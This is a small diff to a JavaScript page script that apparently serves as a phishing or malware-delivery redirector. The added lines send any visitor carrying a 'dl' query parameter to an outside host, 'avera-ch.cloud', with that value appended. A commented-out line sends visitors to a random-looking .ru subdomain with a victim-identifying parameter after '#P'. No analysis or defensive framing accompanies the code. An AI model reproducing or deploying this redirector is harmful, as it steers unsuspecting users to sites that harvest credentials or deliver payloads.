@@ -2,8 +2,13 @@
 
     const urlParams = new URLSearchParams(window.location.search);
     const myParam = urlParams.get('u');
+    const dl = urlParams.get("dl");
 
     const chance = Math.random();
+
+    if (dl) {
+        return window.location = "https://avera-ch.cloud/" + dl;
+    }
 
         if (myParam) {
                 // window.location = "https://mxibzoacqqzb.ju87gns.ru/TzC0P9Xp0ZS/#P" + myParam;
